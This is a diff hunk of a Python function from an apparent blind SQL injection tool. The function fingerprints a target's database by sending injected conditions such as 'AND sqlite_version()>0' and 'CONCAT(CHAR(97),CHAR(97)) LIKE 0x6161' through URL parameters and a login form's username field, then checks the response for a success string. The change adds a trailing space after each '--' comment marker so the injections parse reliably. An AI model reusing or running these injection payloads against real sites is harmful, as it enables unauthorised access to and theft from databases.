@@ -8,22 +8,22 @@ def DBMS_detect(arg):
     global DBMS
     if arg=="G":
         if DBMS==0: # Detection DBMS
-            if(str(requests.get(url+" AND sqlite_version()>0 --").content).find(Chaine_success)!=-1):
+            if(str(requests.get(url+" AND sqlite_version()>0 -- ").content).find(Chaine_success)!=-1):
                 DBMS=2
-            elif(str(requests.get(url+" AND 'aa'='a'||'a' --").content).find(Chaine_success)!=-1):
+            elif(str(requests.get(url+" AND 'aa'='a'||'a' -- ").content).find(Chaine_success)!=-1):
                 DBMS=3
-            elif(str(requests.get(url+" AND CONCAT(CHAR(97),CHAR(97)) LIKE 0x6161 --").content).find(Chaine_success)!=-1):
+            elif(str(requests.get(url+" AND CONCAT(CHAR(97),CHAR(97)) LIKE 0x6161 -- ").content).find(Chaine_success)!=-1):
                 DBMS=1
             else:
                 return False
         return True
     else:
         if DBMS==0: # Detection DBMS
-            if(str(requests.post(url,data={Champ_user:User+"' AND sqlite_version()>0 --",Champ_passwd:'Nothing'}).content).find(Chaine_success)!=-1):
+            if(str(requests.post(url,data={Champ_user:User+"' AND sqlite_version()>0 -- ",Champ_passwd:'Nothing'}).content).find(Chaine_success)!=-1):
                 DBMS=2
-            elif(str(requests.post(url,data={Champ_user:User+"' AND 'aa'='a'||'a' --",Champ_passwd:'Nothing'}).content).find(Chaine_success)!=-1):
+            elif(str(requests.post(url,data={Champ_user:User+"' AND 'aa'='a'||'a' -- ",Champ_passwd:'Nothing'}).content).find(Chaine_success)!=-1):
                 DBMS=3
-            elif(str(requests.post(url,data={Champ_user:User+"' AND CONCAT(CHAR(97),CHAR(97)) LIKE 0x6161 --",Champ_passwd:'Nothing'}).content).find(Chaine_success)!=-1):
+            elif(str(requests.post(url,data={Champ_user:User+"' AND CONCAT(CHAR(97),CHAR(97)) LIKE 0x6161 -- ",Champ_passwd:'Nothing'}).content).find(Chaine_success)!=-1):
                 DBMS=1
             else:
                 return False
